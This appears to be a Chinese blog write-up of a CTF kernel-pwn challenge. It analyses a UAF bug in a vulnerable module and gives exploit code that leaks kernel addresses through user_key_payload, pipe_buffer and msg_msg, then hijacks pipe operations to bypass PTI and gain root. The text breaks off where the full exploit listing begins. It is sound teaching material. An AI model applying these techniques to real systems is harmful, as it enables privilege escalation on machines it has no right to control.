<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel &quot;./bzImage&quot; \</span><br><span class="line">    -append &quot;console=ttyS0 qiet loglevel=3 oops=panic panic=-1 pti=on&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd &quot;./rootfs.cpio&quot; \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -smp cores=1 </span><br></pre></td></tr></table></figure>
<ul>
<li>smap，smep，pti，kaslr</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown root /root/flag</span><br><span class="line">chgrp root /root/flag</span><br><span class="line">chmod 400 /root/flag</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line"></span><br><span class="line">insmod /baby.ko</span><br><span class="line">chmod 666 /dev/baby</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>题目的边界检查有问题，全局变量 <code>heap_var.chunk_list[indext]</code> 出现溢出并且可以覆盖 <code>heap_var.use_list[indext]</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  indext = index;</span><br><span class="line">  chunkt = heap_var.chunk_list[index];</span><br><span class="line">  <span class="keyword">if</span> ( !chunkt )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunkt-&gt;key &lt; key )</span><br><span class="line">  &#123;</span><br><span class="line">    index = <span class="number">2</span> * index + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index = <span class="number">2</span> * index + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">chunk = (Chunk *)kmem_cache_alloc(kmalloc_caches[<span class="number">6</span>], <span class="number">0xDC0</span>LL, <span class="number">0LL</span>); <span class="comment">/* kmalloc-64 */</span></span><br><span class="line">--add_count;</span><br><span class="line">heap_var.use_list[indext] = <span class="number">1LL</span>;</span><br><span class="line">heap_var.chunk_list[indext] = chunk;</span><br><span class="line">chunk-&gt;key = key;</span><br></pre></td></tr></table></figure>
<p>程序通过 <code>heap_var.use_list[indext]</code> 判断 chunk 是否被 free，覆盖这里会导致 UAF</p>
<p>测试 Poc 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x400</span><span class="number">-0x40</span>); <span class="comment">// 0</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x30</span>); <span class="comment">// 1</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x20</span>); <span class="comment">// 3</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x10</span>); <span class="comment">// 7</span></span><br><span class="line">dele(<span class="number">0</span>);</span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x0</span>); <span class="comment">// 15</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0xffffffffc0002480</span> —▸ <span class="number">0xffff88800824dac0</span> ◂— <span class="number">0x400</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0xffffffffc0002488</span> —▸ <span class="number">0xffff88800824dcc0</span> ◂— <span class="number">0x3d0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xffffffffc0002490</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0xffffffffc0002498</span> —▸ <span class="number">0xffff88800824dc40</span> ◂— <span class="number">0x3e0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0xffffffffc00024a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0xffffffffc00024b8</span> —▸ <span class="number">0xffff88800824dd00</span> ◂— <span class="number">0x3f0</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│  <span class="number">0xffffffffc00024c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0xffffffffc00024f8</span> —▸ <span class="number">0xffff88800824dac0</span> ◂— <span class="number">0x400</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>内核模块使用 kmalloc-64，存在 UAF 漏洞但利用有限制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk = heap_var.chunk_list[index];</span><br><span class="line">    <span class="keyword">if</span> ( !chunk )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk-&gt;key &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    index = <span class="number">2</span> * index + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk-&gt;key &lt;= size )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  index = <span class="number">2</span> * index + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内核模块会匹配 <code>chunk-&gt;key</code>，因此用于占位的内核结构体的前2字节必须已知（当然也可以爆破）</p>
<p>此时 <code>user_key_payload</code> 结构体就是最好的选择：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU destructor */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>	datalen;	<span class="comment">/* length of this data */</span></span><br><span class="line">	<span class="keyword">char</span>		data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 rcu 锁触发前，<code>user_key_payload-&gt;rcu_head</code> 都不会被初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff88800828e400</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi r8 <span class="number">0xffff88800828e400</span> ◂— <span class="number">0x400</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│        <span class="number">0xffff88800828e408</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│        <span class="number">0xffff88800828e410</span> ◂— <span class="number">0x20</span> <span class="comment">/* &#x27; &#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│        <span class="number">0xffff88800828e418</span> ◂— <span class="string">&#x27;22222222222222222222222222222222&#x27;</span></span><br><span class="line">... ↓           <span class="number">3</span> skipped</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│        <span class="number">0xffff88800828e438</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>此时可以通过 UAF 修改 <code>user_key_payload-&gt;datalen</code> 来完成泄露</li>
</ul>
<p>泄露脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x400</span><span class="number">-0x40</span>); <span class="comment">// 0</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x30</span>); <span class="comment">// 1</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x20</span>); <span class="comment">// 3</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x10</span>); <span class="comment">// 7</span></span><br><span class="line">dele(<span class="number">0</span>);</span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x00</span>); <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0x32</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">key_id = key_alloc(<span class="string">&quot;11111111&quot;</span>, data, <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">if</span> (key_id &lt; <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;key_alloc error&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">        <span class="comment">/* 1 * pipe_buffer = 0x30 kmalloc-64 */</span> </span><br><span class="line">        err_exit(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>); <span class="comment">// tag</span></span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;BBBBBBBB&quot;</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">*(<span class="keyword">int</span> *)&amp;data[<span class="number">0x0</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改chunk-&gt;key */</span></span><br><span class="line">*(<span class="keyword">int</span> *)&amp;data[<span class="number">0x10</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改user_key_payload-&gt;datalen */</span></span><br><span class="line">edit(<span class="number">0x400</span>,data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> res = key_read(key_id, data, <span class="number">0x400</span>);</span><br><span class="line">print_hex(data,<span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(data)/<span class="number">8</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)&amp;data[i*<span class="number">8</span>] &gt;= <span class="number">0x1800000000</span> &amp;&amp; *(<span class="keyword">uint64_t</span> *)&amp;data[i*<span class="number">8</span>] &lt;= <span class="number">0x3800000000</span>)&#123;</span><br><span class="line">        index = i*<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(index == <span class="number">-1</span>)&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;scan&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe_page_addr = *(<span class="keyword">uint64_t</span> *)&amp;data[index<span class="number">-8</span>];</span><br><span class="line">pipe_ops_addr = *(<span class="keyword">uint64_t</span> *)&amp;data[index+<span class="number">8</span>]; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_page_addr: 0x%lx\n&quot;</span>,pipe_page_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_ops_addr: 0x%lx\n&quot;</span>,pipe_ops_addr);</span><br><span class="line"></span><br><span class="line">kernel_offset = pipe_ops_addr - <span class="number">0xffffffff81a0ec80</span>;</span><br><span class="line">kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;kernel_offset: 0x%lx\n&quot;</span>,kernel_offset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br></pre></td></tr></table></figure>
<p>接下来将 <code>pipe_buffer</code> 释放掉，重新填充 <code>msg_msg</code> 并泄露 <code>msg_msg-&gt;list_head</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = <span class="number">0xffffffff81155279</span> + kernel_offset; <span class="comment">// PUSH_RSI_POP_RSP_POP_4VAL_RET</span></span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = pipe_ops_addr;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i &lt; PIPE_NUM)&#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">*(<span class="keyword">int</span> *)&amp;data[<span class="number">0x0</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改chunk-&gt;key */</span></span><br><span class="line">*(<span class="keyword">int</span> *)&amp;data[<span class="number">0x10</span>] = <span class="number">0x400</span>; <span class="comment">/* 修改user_key_payload-&gt;datalen */</span></span><br><span class="line">edit(<span class="number">0x400</span>,data);</span><br><span class="line"></span><br><span class="line">res = key_read(key_id, data, <span class="number">0x400</span>);</span><br><span class="line">print_hex(data,<span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(data)/<span class="number">8</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)&amp;data[i*<span class="number">8</span>] == pipe_ops_addr)&#123;</span><br><span class="line">        index = i*<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(index == <span class="number">-1</span>)&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;scan&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg_addr = *(<span class="keyword">uint64_t</span> *)&amp;data[index<span class="number">-8</span>*<span class="number">5</span>];</span><br><span class="line">victim_addr = msg_addr + <span class="number">0x30</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;msg_addr: 0x%lx\n&quot;</span>,msg_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim_addr: 0x%lx\n&quot;</span>,victim_addr);</span><br></pre></td></tr></table></figure>
<p>最后就可以劫持 <code>pipe_buffer</code> 了</p>
<p>先释放 <code>user_key_payload</code> 部署 <code>pipe_buffer</code>，由于我们泄露了 <code>msg_msg-&gt;list_head</code>，因此我们可以直接将 <code>pipe_buf_operations</code> 伪造在 <code>msg_msg</code> 中（地址已知）</p>
<p>利用 SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 绕过 pti，并提权（由于本题目没有给符号，因此相关地址需要使用 bindiff 进行推测）</p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span 